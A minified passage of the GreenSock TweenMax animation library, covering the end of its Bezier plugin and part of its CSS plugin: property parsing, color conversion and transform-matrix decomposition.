i,s,r,n,a,o,h,l,_,u,c=this._segCount,f=this._func,p=this._target,m=e!==this._startRatio;if(this._timeRes){if(_=this._lengths,u=this._curSeg,e*=this._length,r=this._li,e>this._l2&&c-1>r){for(l=c-1;l>r&&(this._l2=_[++r])<=e;);this._l1=_[r-1],this._li=r,this._curSeg=u=this._segments[r],this._s2=u[this._s1=this._si=0];
}else if(e<this._l1&&r>0){for(;r>0&&(this._l1=_[--r])>=e;);0===r&&e<this._l1?this._l1=0:r++,this._l2=_[r],this._li=r,this._curSeg=u=this._segments[r],this._s1=u[(this._si=u.length-1)-1]||0,this._s2=u[this._si]}if(i=r,e-=this._l1,r=this._si,e>this._s2&&r<u.length-1){for(l=u.length-1;l>r&&(this._s2=u[++r])<=e;);this._s1=u[r-1],this._si=r}else if(e<this._s1&&r>0){for(;r>0&&(this._s1=u[--r])>=e;);0===r&&e<this._s1?this._s1=0:r++,this._s2=u[r],this._si=r}o=(r+(e-this._s1)/(this._s2-this._s1))*this._prec}else i=0>e?0:e>=1?c-1:c*e>>0,o=(e-i*(1/c))*c;for(s=1-o,r=this._props.length;--r>-1;)n=this._props[r],a=this._beziers[n][i],h=(o*o*a.da+3*s*(o*a.ca+s*a.ba))*o+a.a,this._round[n]&&(h=Math.round(h)),f[n]?p[n](h):p[n]=h;if(this._autoRotate){var d,g,v,y,T,x,w,b=this._autoRotate;for(r=b.length;--r>-1;)n=b[r][2],x=b[r][3]||0,w=b[r][4]===!0?1:t,a=this._beziers[b[r][0]],d=this._beziers[b[r][1]],a&&d&&(a=a[i],d=d[i],g=a.a+(a.b-a.a)*o,y=a.b+(a.c-a.b)*o,g+=(y-g)*o,y+=(a.c+(a.d-a.c)*o-y)*o,v=d.a+(d.b-d.a)*o,T=d.b+(d.c-d.b)*o,v+=(T-v)*o,T+=(d.c+(d.d-d.c)*o-T)*o,h=m?Math.atan2(T-v,y-g)*w+x:this._initialRotations[r],f[n]?p[n](h):p[n]=h)}}}),d=m.prototype;m.bezierThrough=u,m.cubicToQuadratic=h,m._autoCSS=!0,m.quadraticToCubic=function(t,e,i){return new a(t,(2*e+t)/3,(2*e+i)/3,i)},m._cssRegister=function(){var t=n.CSSPlugin;if(t){var e=t._internals,i=e._parseToProxy,s=e._setPluginRatio,r=e.CSSPropTween;e._registerComplexSpecialProp("bezier",{parser:function(t,e,n,a,o,h){e instanceof Array&&(e={values:e}),h=new m;var l,_,u,c=e.values,f=c.length-1,p=[],d={};if(0>f)return o;for(l=0;f>=l;l++)u=i(t,c[l],a,o,h,f!==l),p[l]=u.end;for(_ in e)d[_]=e[_];return d.values=p,o=new r(t,"bezier",0,0,u.pt,2),o.data=u,o.plugin=h,o.setRatio=s,0===d.autoRotate&&(d.autoRotate=!0),!d.autoRotate||d.autoRotate instanceof Array||(l=d.autoRotate===!0?0:Number(d.autoRotate),d.autoRotate=null!=u.end.left?[["left","top","rotation",l,!1]]:null!=u.end.x?[["x","y","rotation",l,!1]]:!1),d.autoRotate&&(a._transform||a._enableTransforms(!1),u.autoRotate=a._target._gsTransform),h._onInitTween(u.proxy,d,a._tween),o}})}},d._roundProps=function(t,e){for(var i=this._overwriteProps,s=i.length;--s>-1;)(t[i[s]]||t.bezier||t.bezierThrough)&&(this._round[i[s]]=e)},d._kill=function(t){var e,i,s=this._props;for(e in this._beziers)if(e in t)for(delete this._beziers[e],delete this._func[e],i=s.length;--i>-1;)s[i]===e&&s.splice(i,1);return this._super._kill.call(this,t)}}(),_gsScope._gsDefine("plugins.CSSPlugin",["plugins.TweenPlugin","TweenLite"],function(t,e){var i,s,r,n,a=function(){t.call(this,"css"),this._overwriteProps.length=0,this.setRatio=a.prototype.setRatio},o=_gsScope._gsDefine.globals,h={},l=a.prototype=new t("css");l.constructor=a,a.version="1.17.0",a.API=2,a.defaultTransformPerspective=0,a.defaultSkewType="compensated",a.defaultSmoothOrigin=!0,l="px",a.suffixMap={top:l,right:l,bottom:l,left:l,width:l,height:l,fontSize:l,padding:l,margin:l,perspective:l,lineHeight:""};var _,u,c,f,p,m,d=/(?:\d|\-\d|\.\d|\-\.\d)+/g,g=/(?:\d|\-\d|\.\d|\-\.\d|\+=\d|\-=\d|\+=.\d|\-=\.\d)+/g,v=/(?:\+=|\-=|\-|\b)[\d\-\.]+[a-zA-Z0-9]*(?:%|\b)/gi,y=/(?![+-]?\d*\.?\d+|[+-]|e[+-]\d+)[^0-9]/g,T=/(?:\d|\-|\+|=|#|\.)*/g,x=/opacity *= *([^)]*)/i,w=/opacity:([^;]*)/i,b=/alpha\(opacity *=.+?\)/i,P=/^(rgb|hsl)/,k=/([A-Z])/g,O=/-([a-z])/gi,S=/(^(?:url\(\"|url\())|(?:(\"\))$|\)$)/gi,R=function(t,e){return e.toUpperCase()},A=/(?:Left|Right|Width)/i,C=/(M11|M12|M21|M22)=[\d\-\.e]+/gi,D=/progid\:DXImageTransform\.Microsoft\.Matrix\(.+?\)/i,M=/,(?=[^\)]*(?:\(|$))/gi,z=Math.PI/180,F=180/Math.PI,I={},N=document,X=function(t){return N.createElementNS?N.createElementNS("http://www.w3.org/1999/xhtml",t):N.createElement(t)},L=X("div"),E=X("img"),Y=a._internals={_specialProps:h},B=navigator.userAgent,j=function(){var t=B.indexOf("Android"),e=X("a");return c=-1!==B.indexOf("Safari")&&-1===B.indexOf("Chrome")&&(-1===t||Number(B.substr(t+8,1))>3),p=c&&Number(B.substr(B.indexOf("Version/")+8,1))<6,f=-1!==B.indexOf("Firefox"),(/MSIE ([0-9]{1,}[\.0-9]{0,})/.exec(B)||/Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/.exec(B))&&(m=parseFloat(RegExp.$1)),e?(e.style.cssText="top:1px;opacity:.55;",/^0.55/.test(e.style.opacity)):!1}(),U=function(t){return x.test("string"==typeof t?t:(t.currentStyle?t.currentStyle.filter:t.style.filter)||"")?parseFloat(RegExp.$1)/100:1},V=function(t){window.console&&console.log(t)},q="",W="",Z=function(t,e){e=e||L;var i,s,r=e.style;if(void 0!==r[t])return t;for(t=t.charAt(0).toUpperCase()+t.substr(1),i=["O","Moz","ms","Ms","Webkit"],s=5;--s>-1&&void 0===r[i[s]+t];);return s>=0?(W=3===s?"ms":i[s],q="-"+W.toLowerCase()+"-",W+t):null},G=N.defaultView?N.defaultView.getComputedStyle:function(){},$=a.getStyle=function(t,e,i,s,r){var n;return j||"opacity"!==e?(!s&&t.style[e]?n=t.style[e]:(i=i||G(t))?n=i[e]||i.getPropertyValue(e)||i.getPropertyValue(e.replace(k,"-$1").toLowerCase()):t.currentStyle&&(n=t.currentStyle[e]),null==r||n&&"none"!==n&&"auto"!==n&&"auto auto"!==n?n:r):U(t)},Q=Y.convertToPixels=function(t,i,s,r,n){if("px"===r||!r)return s;if("auto"===r||!s)return 0;var o,h,l,_=A.test(i),u=t,c=L.style,f=0>s;if(f&&(s=-s),"%"===r&&-1!==i.indexOf("border"))o=s/100*(_?t.clientWidth:t.clientHeight);else{if(c.cssText="border:0 solid red;position:"+$(t,"position")+";line-height:0;","%"!==r&&u.appendChild)c[_?"borderLeftWidth":"borderTopWidth"]=s+r;else{if(u=t.parentNode||N.body,h=u._gsCache,l=e.ticker.frame,h&&_&&h.time===l)return h.width*s/100;c[_?"width":"height"]=s+r}u.appendChild(L),o=parseFloat(L[_?"offsetWidth":"offsetHeight"]),u.removeChild(L),_&&"%"===r&&a.cacheWidths!==!1&&(h=u._gsCache=u._gsCache||{},h.time=l,h.width=o/s*100),0!==o||n||(o=Q(t,i,s,r,!0))}return f?-o:o},H=Y.calculateOffset=function(t,e,i){if("absolute"!==$(t,"position",i))return 0;var s="left"===e?"Left":"Top",r=$(t,"margin"+s,i);return t["offset"+s]-(Q(t,e,parseFloat(r),r.replace(T,""))||0)},K=function(t,e){var i,s,r,n={};if(e=e||G(t,null))if(i=e.length)for(;--i>-1;)r=e[i],(-1===r.indexOf("-transform")||Pt===r)&&(n[r.replace(O,R)]=e.getPropertyValue(r));else for(i in e)(-1===i.indexOf("Transform")||bt===i)&&(n[i]=e[i]);else if(e=t.currentStyle||t.style)for(i in e)"string"==typeof i&&void 0===n[i]&&(n[i.replace(O,R)]=e[i]);return j||(n.opacity=U(t)),s=Nt(t,e,!1),n.rotation=s.rotation,n.skewX=s.skewX,n.scaleX=s.scaleX,n.scaleY=s.scaleY,n.x=s.x,n.y=s.y,Ot&&(n.z=s.z,n.rotationX=s.rotationX,n.rotationY=s.rotationY,n.scaleZ=s.scaleZ),n.filters&&delete n.filters,n},J=function(t,e,i,s,r){var n,a,o,h={},l=t.style;for(a in i)"cssText"!==a&&"length"!==a&&isNaN(a)&&(e[a]!==(n=i[a])||r&&r[a])&&-1===a.indexOf("Origin")&&("number"==typeof n||"string"==typeof n)&&(h[a]="auto"!==n||"left"!==a&&"top"!==a?""!==n&&"auto"!==n&&"none"!==n||"string"!=typeof e[a]||""===e[a].replace(y,"")?n:0:H(t,a),void 0!==l[a]&&(o=new ft(l,a,l[a],o)));if(s)for(a in s)"className"!==a&&(h[a]=s[a]);return{difs:h,firstMPT:o}},tt={width:["Left","Right"],height:["Top","Bottom"]},et=["marginLeft","marginRight","marginTop","marginBottom"],it=function(t,e,i){var s=parseFloat("width"===e?t.offsetWidth:t.offsetHeight),r=tt[e],n=r.length;for(i=i||G(t,null);--n>-1;)s-=parseFloat($(t,"padding"+r[n],i,!0))||0,s-=parseFloat($(t,"border"+r[n]+"Width",i,!0))||0;return s},st=function(t,e){(null==t||""===t||"auto"===t||"auto auto"===t)&&(t="0 0");var i=t.split(" "),s=-1!==t.indexOf("left")?"0%":-1!==t.indexOf("right")?"100%":i[0],r=-1!==t.indexOf("top")?"0%":-1!==t.indexOf("bottom")?"100%":i[1];return null==r?r="center"===s?"50%":"0":"center"===r&&(r="50%"),("center"===s||isNaN(parseFloat(s))&&-1===(s+"").indexOf("="))&&(s="50%"),t=s+" "+r+(i.length>2?" "+i[2]:""),e&&(e.oxp=-1!==s.indexOf("%"),e.oyp=-1!==r.indexOf("%"),e.oxr="="===s.charAt(1),e.oyr="="===r.charAt(1),e.ox=parseFloat(s.replace(y,"")),e.oy=parseFloat(r.replace(y,"")),e.v=t),e||t},rt=function(t,e){return"string"==typeof t&&"="===t.charAt(1)?parseInt(t.charAt(0)+"1",10)*parseFloat(t.substr(2)):parseFloat(t)-parseFloat(e)},nt=function(t,e){return null==t?e:"string"==typeof t&&"="===t.charAt(1)?parseInt(t.charAt(0)+"1",10)*parseFloat(t.substr(2))+e:parseFloat(t)},at=function(t,e,i,s){var r,n,a,o,h,l=1e-6;return null==t?o=e:"number"==typeof t?o=t:(r=360,n=t.split("_"),h="="===t.charAt(1),a=(h?parseInt(t.charAt(0)+"1",10)*parseFloat(n[0].substr(2)):parseFloat(n[0]))*(-1===t.indexOf("rad")?1:F)-(h?0:e),n.length&&(s&&(s[i]=e+a),-1!==t.indexOf("short")&&(a%=r,a!==a%(r/2)&&(a=0>a?a+r:a-r)),-1!==t.indexOf("_cw")&&0>a?a=(a+9999999999*r)%r-(a/r|0)*r:-1!==t.indexOf("ccw")&&a>0&&(a=(a-9999999999*r)%r-(a/r|0)*r)),o=e+a),l>o&&o>-l&&(o=0),o},ot={aqua:[0,255,255],lime:[0,255,0],silver:[192,192,192],black:[0,0,0],maroon:[128,0,0],teal:[0,128,128],blue:[0,0,255],navy:[0,0,128],white:[255,255,255],fuchsia:[255,0,255],olive:[128,128,0],yellow:[255,255,0],orange:[255,165,0],gray:[128,128,128],purple:[128,0,128],green:[0,128,0],red:[255,0,0],pink:[255,192,203],cyan:[0,255,255],transparent:[255,255,255,0]},ht=function(t,e,i){return t=0>t?t+1:t>1?t-1:t,255*(1>6*t?e+(i-e)*t*6:.5>t?i:2>3*t?e+(i-e)*(2/3-t)*6:e)+.5|0},lt=a.parseColor=function(t){var e,i,s,r,n,a;return t&&""!==t?"number"==typeof t?[t>>16,t>>8&255,255&t]:(","===t.charAt(t.length-1)&&(t=t.substr(0,t.length-1)),ot[t]?ot[t]:"#"===t.charAt(0)?(4===t.length&&(e=t.charAt(1),i=t.charAt(2),s=t.charAt(3),t="#"+e+e+i+i+s+s),t=parseInt(t.substr(1),16),[t>>16,t>>8&255,255&t]):"hsl"===t.substr(0,3)?(t=t.match(d),r=Number(t[0])%360/360,n=Number(t[1])/100,a=Number(t[2])/100,i=.5>=a?a*(n+1):a+n-a*n,e=2*a-i,t.length>3&&(t[3]=Number(t[3])),t[0]=ht(r+1/3,e,i),t[1]=ht(r,e,i),t[2]=ht(r-1/3,e,i),t):(t=t.match(d)||ot.transparent,t[0]=Number(t[0]),t[1]=Number(t[1]),t[2]=Number(t[2]),t.length>3&&(t[3]=Number(t[3])),t)):ot.black},_t="(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#.+?\\b";for(l in ot)_t+="|"+l+"\\b";_t=new RegExp(_t+")","gi");var ut=function(t,e,i,s){if(null==t)return function(t){return t};var r,n=e?(t.match(_t)||[""])[0]:"",a=t.split(n).join("").match(v)||[],o=t.substr(0,t.indexOf(a[0])),h=")"===t.charAt(t.length-1)?")":"",l=-1!==t.indexOf(" ")?" ":",",_=a.length,u=_>0?a[0].replace(d,""):"";return _?r=e?function(t){var e,c,f,p;if("number"==typeof t)t+=u;else if(s&&M.test(t)){for(p=t.replace(M,"|").split("|"),f=0;f<p.length;f++)p[f]=r(p[f]);return p.join(",")}if(e=(t.match(_t)||[n])[0],c=t.split(e).join("").match(v)||[],f=c.length,_>f--)for(;++f<_;)c[f]=i?c[(f-1)/2|0]:a[f];return o+c.join(l)+l+e+h+(-1!==t.indexOf("inset")?" inset":"")}:function(t){var e,n,c;if("number"==typeof t)t+=u;else if(s&&M.test(t)){for(n=t.replace(M,"|").split("|"),c=0;c<n.length;c++)n[c]=r(n[c]);return n.join(",")}if(e=t.match(v)||[],c=e.length,_>c--)for(;++c<_;)e[c]=i?e[(c-1)/2|0]:a[c];return o+e.join(l)+h}:function(t){return t}},ct=function(t){return t=t.split(","),function(e,i,s,r,n,a,o){var h,l=(i+"").split(" ");for(o={},h=0;4>h;h++)o[t[h]]=l[h]=l[h]||l[(h-1)/2>>0];return r.parse(e,o,n,a)}},ft=(Y._setPluginRatio=function(t){this.plugin.setRatio(t);for(var e,i,s,r,n=this.data,a=n.proxy,o=n.firstMPT,h=1e-6;o;)e=a[o.v],o.r?e=Math.round(e):h>e&&e>-h&&(e=0),o.t[o.p]=e,o=o._next;if(n.autoRotate&&(n.autoRotate.rotation=a.rotation),1===t)for(o=n.firstMPT;o;){if(i=o.t,i.type){if(1===i.type){for(r=i.xs0+i.s+i.xs1,s=1;s<i.l;s++)r+=i["xn"+s]+i["xs"+(s+1)];i.e=r}}else i.e=i.s+i.xs0;o=o._next}},function(t,e,i,s,r){this.t=t,this.p=e,this.v=i,this.r=r,s&&(s._prev=this,this._next=s)}),pt=(Y._parseToProxy=function(t,e,i,s,r,n){var a,o,h,l,_,u=s,c={},f={},p=i._transform,m=I;for(i._transform=null,I=e,s=_=i.parse(t,e,s,r),I=m,n&&(i._transform=p,u&&(u._prev=null,u._prev&&(u._prev._next=null)));s&&s!==u;){if(s.type<=1&&(o=s.p,f[o]=s.s+s.c,c[o]=s.s,n||(l=new ft(s,"s",o,l,s.r),s.c=0),1===s.type))for(a=s.l;--a>0;)h="xn"+a,o=s.p+"_"+h,f[o]=s.data[h],c[o]=s[h],n||(l=new ft(s,h,o,l,s.rxp[h]));s=s._next}return{proxy:c,end:f,firstMPT:l,pt:_}},Y.CSSPropTween=function(t,e,s,r,a,o,h,l,_,u,c){this.t=t,this.p=e,this.s=s,this.c=r,this.n=h||e,t instanceof pt||n.push(this.n),this.r=l,this.type=o||0,_&&(this.pr=_,i=!0),this.b=void 0===u?s:u,this.e=void 0===c?s+r:c,a&&(this._next=a,a._prev=this)}),mt=function(t,e,i,s,r,n){var a=new pt(t,e,i,s-i,r,-1,n);return a.b=i,a.e=a.xs0=s,a},dt=a.parseComplex=function(t,e,i,s,r,n,a,o,h,l){i=i||n||"",a=new pt(t,e,0,0,a,l?2:1,null,!1,o,i,s),s+="";var u,c,f,p,m,v,y,T,x,w,b,k,O=i.split(", ").join(",").split(" "),S=s.split(", ").join(",").split(" "),R=O.length,A=_!==!1;for((-1!==s.indexOf(",")||-1!==i.indexOf(","))&&(O=O.join(" ").replace(M,", ").split(" "),S=S.join(" ").replace(M,", ").split(" "),R=O.length),R!==S.length&&(O=(n||"").split(" "),R=O.length),a.plugin=h,a.setRatio=l,u=0;R>u;u++)if(p=O[u],m=S[u],T=parseFloat(p),T||0===T)a.appendXtra("",T,rt(m,T),m.replace(g,""),A&&-1!==m.indexOf("px"),!0);else if(r&&("#"===p.charAt(0)||ot[p]||P.test(p)))k=","===m.charAt(m.length-1)?"),":")",p=lt(p),m=lt(m),x=p.length+m.length>6,x&&!j&&0===m[3]?(a["xs"+a.l]+=a.l?" transparent":"transparent",a.e=a.e.split(S[u]).join("transparent")):(j||(x=!1),a.appendXtra(x?"rgba(":"rgb(",p[0],m[0]-p[0],",",!0,!0).appendXtra("",p[1],m[1]-p[1],",",!0).appendXtra("",p[2],m[2]-p[2],x?",":k,!0),x&&(p=p.length<4?1:p[3],a.appendXtra("",p,(m.length<4?1:m[3])-p,k,!1)));else if(v=p.match(d)){if(y=m.match(g),!y||y.length!==v.length)return a;for(f=0,c=0;c<v.length;c++)b=v[c],w=p.indexOf(b,f),a.appendXtra(p.substr(f,w-f),Number(b),rt(y[c],b),"",A&&"px"===p.substr(w+b.length,2),0===c),f=w+b.length;a["xs"+a.l]+=p.substr(f)}else a["xs"+a.l]+=a.l?" "+p:p;if(-1!==s.indexOf("=")&&a.data){for(k=a.xs0+a.data.s,u=1;u<a.l;u++)k+=a["xs"+u]+a.data["xn"+u];a.e=k+a["xs"+u]}return a.l||(a.type=-1,a.xs0=a.e),a.xfirst||a},gt=9;for(l=pt.prototype,l.l=l.pr=0;--gt>0;)l["xn"+gt]=0,l["xs"+gt]="";l.xs0="",l._next=l._prev=l.xfirst=l.data=l.plugin=l.setRatio=l.rxp=null,l.appendXtra=function(t,e,i,s,r,n){var a=this,o=a.l;return a["xs"+o]+=n&&o?" "+t:t||"",i||0===o||a.plugin?(a.l++,a.type=a.setRatio?2:1,a["xs"+a.l]=s||"",o>0?(a.data["xn"+o]=e+i,a.rxp["xn"+o]=r,a["xn"+o]=e,a.plugin||(a.xfirst=new pt(a,"xn"+o,e,i,a.xfirst||a,0,a.n,r,a.pr),a.xfirst.xs0=0),a):(a.data={s:e+i},a.rxp={},a.s=e,a.c=i,a.r=r,a)):(a["xs"+o]+=e+(s||""),a)};var vt=function(t,e){e=e||{},this.p=e.prefix?Z(t)||t:t,h[t]=h[this.p]=this,this.format=e.formatter||ut(e.defaultValue,e.color,e.collapsible,e.multi),e.parser&&(this.parse=e.parser),this.clrs=e.color,this.multi=e.multi,this.keyword=e.keyword,this.dflt=e.defaultValue,this.pr=e.priority||0},yt=Y._registerComplexSpecialProp=function(t,e,i){"object"!=typeof e&&(e={parser:i});var s,r,n=t.split(","),a=e.defaultValue;for(i=i||[a],s=0;s<n.length;s++)e.prefix=0===s&&e.prefix,e.defaultValue=i[s]||a,r=new vt(n[s],e)},Tt=function(t){if(!h[t]){var e=t.charAt(0).toUpperCase()+t.substr(1)+"Plugin";yt(t,{parser:function(t,i,s,r,n,a,l){var _=o.com.greensock.plugins[e];return _?(_._cssRegister(),h[s].parse(t,i,s,r,n,a,l)):(V("Error: "+e+" js file not loaded."),n)}})}};l=vt.prototype,l.parseComplex=function(t,e,i,s,r,n){var a,o,h,l,_,u,c=this.keyword;if(this.multi&&(M.test(i)||M.test(e)?(o=e.replace(M,"|").split("|"),h=i.replace(M,"|").split("|")):c&&(o=[e],h=[i])),h){for(l=h.length>o.length?h.length:o.length,a=0;l>a;a++)e=o[a]=o[a]||this.dflt,i=h[a]=h[a]||this.dflt,c&&(_=e.indexOf(c),u=i.indexOf(c),_!==u&&(-1===u?o[a]=o[a].split(c).join(""):-1===_&&(o[a]+=" "+c)));e=o.join(", "),i=h.join(", ")}return dt(t,this.p,e,i,this.clrs,this.dflt,s,this.pr,r,n)},l.parse=function(t,e,i,s,n,a,o){return this.parseComplex(t.style,this.format($(t,this.p,r,!1,this.dflt)),this.format(e),n,a)},a.registerSpecialProp=function(t,e,i){yt(t,{parser:function(t,s,r,n,a,o,h){var l=new pt(t,r,0,0,a,2,r,!1,i);return l.plugin=o,l.setRatio=e(t,s,n._tween,r),l},priority:i})},a.useSVGTransformAttr=c||f;var xt,wt="scaleX,scaleY,scaleZ,x,y,z,skewX,skewY,rotation,rotationX,rotationY,perspective,xPercent,yPercent".split(","),bt=Z("transform"),Pt=q+"transform",kt=Z("transformOrigin"),Ot=null!==Z("perspective"),St=Y.Transform=function(){this.perspective=parseFloat(a.defaultTransformPerspective)||0,this.force3D=a.defaultForce3D!==!1&&Ot?a.defaultForce3D||"auto":!1},Rt=window.SVGElement,At=function(t,e,i){var s,r=N.createElementNS("http://www.w3.org/2000/svg",t),n=/([a-z])([A-Z])/g;for(s in i)r.setAttributeNS(null,s.replace(n,"$1-$2").toLowerCase(),i[s]);return e.appendChild(r),r},Ct=N.documentElement,Dt=function(){var t,e,i,s=m||/Android/i.test(B)&&!window.chrome;return N.createElementNS&&!s&&(t=At("svg",Ct),e=At("rect",t,{width:100,height:50,x:100}),i=e.getBoundingClientRect().width,e.style[kt]="50% 50%",e.style[bt]="scaleX(0.5)",s=i===e.getBoundingClientRect().width&&!(f&&Ot),Ct.removeChild(t)),s}(),Mt=function(t,e,i,s,r){var n,o,h,l,_,u,c,f,p,m,d,g,v,y,T=t._gsTransform,x=It(t,!0);T&&(v=T.xOrigin,y=T.yOrigin),(!s||(n=s.split(" ")).length<2)&&(c=t.getBBox(),e=st(e).split(" "),n=[(-1!==e[0].indexOf("%")?parseFloat(e[0])/100*c.width:parseFloat(e[0]))+c.x,(-1!==e[1].indexOf("%")?parseFloat(e[1])/100*c.height:parseFloat(e[1]))+c.y]),i.xOrigin=l=parseFloat(n[0]),i.yOrigin=_=parseFloat(n[1]),s&&x!==Ft&&(u=x[0],c=x[1],f=x[2],p=x[3],m=x[4],d=x[5],g=u*p-c*f,o=l*(p/g)+_*(-f/g)+(f*d-p*m)/g,h=l*(-c/g)+_*(u/g)-(u*d-c*m)/g,l=i.xOrigin=n[0]=o,_=i.yOrigin=n[1]=h),T&&(r||r!==!1&&a.defaultSmoothOrigin!==!1?(o=l-v,h=_-y,T.xOffset+=o*x[0]+h*x[2]-o,T.yOffset+=o*x[1]+h*x[3]-h):T.xOffset=T.yOffset=0),t.setAttribute("data-svg-origin",n.join(" "))},zt=function(t){return!!(Rt&&"function"==typeof t.getBBox&&t.getCTM&&(!t.parentNode||t.parentNode.getBBox&&t.parentNode.getCTM))},Ft=[1,0,0,1,0,0],It=function(t,e){var i,s,r,n,a,o=t._gsTransform||new St,h=1e5;if(bt?s=$(t,Pt,null,!0):t.currentStyle&&(s=t.currentStyle.filter.match(C),s=s&&4===s.length?[s[0].substr(4),Number(s[2].substr(4)),Number(s[1].substr(4)),s[3].substr(4),o.x||0,o.y||0].join(","):""),i=!s||"none"===s||"matrix(1, 0, 0, 1, 0, 0)"===s,(o.svg||t.getBBox&&zt(t))&&(i&&-1!==(t.style[bt]+"").indexOf("matrix")&&(s=t.style[bt],i=0),r=t.getAttribute("transform"),i&&r&&(-1!==r.indexOf("matrix")?(s=r,i=0):-1!==r.indexOf("translate")&&(s="matrix(1,0,0,1,"+r.match(/(?:\-|\b)[\d\-\.e]+\b/gi).join(",")+")",i=0))),i)return Ft;for(r=(s||"").match(/(?:\-|\b)[\d\-\.e]+\b/gi)||[],gt=r.length;--gt>-1;)n=Number(r[gt]),r[gt]=(a=n-(n|=0))?(a*h+(0>a?-.5:.5)|0)/h+n:n;return e&&r.length>6?[r[0],r[1],r[4],r[5],r[12],r[13]]:r},Nt=Y.getTransform=function(t,i,s,n){if(t._gsTransform&&s&&!n)return t._gsTransform;var o,h,l,_,u,c,f=s?t._gsTransform||new St:new St,p=f.scaleX<0,m=2e-5,d=1e5,g=Ot?parseFloat($(t,kt,i,!1,"0 0 0").split(" ")[2])||f.zOrigin||0:0,v=parseFloat(a.defaultTransformPerspective)||0;if(f.svg=!(!t.getBBox||!zt(t)),f.svg&&(Mt(t,$(t,kt,r,!1,"50% 50%")+"",f,t.getAttribute("data-svg-origin")),xt=a.useSVGTransformAttr||Dt),o=It(t),o!==Ft){if(16===o.length){var y,T,x,w,b,P=o[0],k=o[1],O=o[2],S=o[3],R=o[4],A=o[5],C=o[6],D=o[7],M=o[8],z=o[9],I=o[10],N=o[12],X=o[13],L=o[14],E=o[11],Y=Math.atan2(C,I);f.zOrigin&&(L=-f.zOrigin,N=M*L-o[12],X=z*L-o[13],L=I*L+f.zOrigin-o[14]),f.rotationX=Y*F,Y&&(w=Math.cos(-Y),b=Math.sin(-Y),y=R*w+M*b,T=A*w+z*b,x=C*w+I*b,M=R*-b+M*w,z=A*-b+z*w,I=C*-b+I*w,E=D*-b+E*w,R=y,A=T,C=x),Y=Math.atan2(M,I),f.rotationY=Y*F,Y&&(w=Math.cos(-Y),b=Math.sin(-Y),y=P*w-M*b,T=k*w-z*b,x=O*w-I*b,z=k*b+z*w,I=O*b+I*w,E=S*b+E*w,P=y,k=T,O=x),Y=Math.atan2(k,P),f.rotation=Y*F,Y&&(w=Math.cos(-Y),b=Math.sin(-Y),P=P*w+R*b,T=k*w+A*b,A=k*-b+A*w,C=O*-b+C*w,k=T),f.rotationX&&Math.abs(f.rotationX)+Math.abs(f.rotation)>359.9&&(f.rotationX=f.rotation=0,f.rotationY+=180),f.scaleX=(Math.sqrt(P*P+k*k)*d+.5|0)/d,f.scaleY=(Math.sqrt(A*A+z*z)*d+.5|0)/d,f.scaleZ=(Math.sqrt(C*C+I*I)*d+.5|0)/d,f.skewX=0,f.perspective=E?1/(0>E?-E:E):0,f.x=N,f.y=X,f.z=L,f.svg&&(f.x-=f.xOrigin-(f.xOrigin*P-f.yOrigin*R),f.y-=f.yOrigin-(f.yOrigin*k-f.xOrigin*A))}else if((!Ot||n||!o.length||f.x!==o[4]||f.y!==o[5]||!f.rotationX&&!f.rotationY)&&(void 0===f.x||"none"!==$(t,"display",i))){var B=o.length>=6,j=B?o[0]:1,U=o[1]||0,V=o[2]||0,q=B?o[3]:1;f.x=o[4]||0,f.y=o[5]||0,l=Math.sqrt(j*j+U*U),_=Math.sqrt(q*q+V*V),u=j||U?Math.atan2(U,j)*F:f.rotation||0,c=V||q?Math.atan2(V,q)*F+u:f.skewX||0,Math.abs(c)>90&&Math.abs(c)<270&&(p?(l*=-1,c+=0>=u?180:-180,u+=0>=u?180:-180):(_*=-1,c+=0>=c?180:-180)),f.scaleX=l,f.scaleY=_,f.rotation=u,f.skewX=c,Ot&&(f.rotationX=f.rotationY=f.z=0,f.perspective=v,f.scaleZ=1),f.svg&&(f.x-=f.xOrigin-(f.xOrigin*j+f.yOrigin*V),f.y-=f.yOrigin-(f.xOrigin*U+f.yOrigin*q))}f.zOrigin=g;for(h in f)f[h]<m&&f[h]>-m&&(f[h]=0)}return s&&(t._gsTransform=f,f.svg&&(xt&&t.style[bt]?e.delayedCall(.001,function(){Yt(t.style,bt)}):!xt&&t.getAttribute("transform")&&e.delayedCall(.001,function(){t.removeAttribute("transform")}))),f},Xt=function(t){var e,i,s=this.data,r=-s.rotation*z,n=r+s.skewX*z,a=1e5,o=(Math.cos(r)*s.scaleX*a|0)/a,h=(Math.sin(r)*s.scaleX*a|0)/a,l=(Math.sin(n)*-s.scaleY*a|0)/a,_=(Math.cos(n)*s.scaleY*a|0)/a,u=this.t.style,c=this.t.currentStyle;if(c){i=h,h=-l,l=-i,e=c.filter,u.filter="";var f,p,d=this.t.offsetWidth,g=this.t.offsetHeight,v="absolute"!==c.position,y="progid:DXImageTransform.Microsoft.Matrix(M11="+o+", M12="+h+", M21="+l+", M22="+_,w=s.x+d*s.xPercent/100,b=s.y+g*s.yPercent/100;if(null!=s.ox&&(f=(s.oxp?d*s.ox*.01:s.ox)-d/2,p=(s.oyp?g*s.oy*.01:s.oy)-g/2,w+=f-(f*o+p*h),b+=p-(f*l+p*_)),v?(f=d/2,p=g/2,y+=", Dx="+(f-(f*o+p*h)+w)+", Dy="+(p-(f*l+p*_)+b)+")"):y+=", sizingMethod='auto expand')",-1!==e.indexOf("DXImageTransform.Microsoft.Matrix(")?u.filter=e.replace(D,y):u.filter=y+" "+e,(0===t||1===t)&&1===o&&0===h&&0===l&&1===_&&(v&&-1===y.indexOf("Dx=0, Dy=0")||x.test(e)&&100!==parseFloat(RegExp.$1)||-1===e.indexOf(e.indexOf("Alpha"))&&u.removeAttribute("filter")),!v){var P,k,O,S=8>m?1:-1;for(f=s.ieOffsetX||0,p=s.ieOffsetY||0,s.ieOffsetX=Math.round((d-((0>o?-o:o)*d+(0>h?-h:h)*g))/2+w),s.ieOffsetY=Math.round((g-((0>_?-_:_)*g+(0>l?-l:l)*d))/2+b),gt=0;4>gt;gt++)k=et[gt],P=c[k],i=-1!==P.indexOf("px")?parseFloat(P):Q(this.t,k,parseFloat(P),P.replace(T,""))||0,O=i!==s[k]?2>gt?-s.ieOffsetX:-s.ieOffsetY:2>gt?f-s.ieOffsetX:p-s.ieOffsetY,u[k]=(s[k]=Math.round(i-O*(0===gt||2===gt?1:S)))+"px"}}},Lt=Y.set3DTransformRatio=Y.setTransformRatio=function(t){var 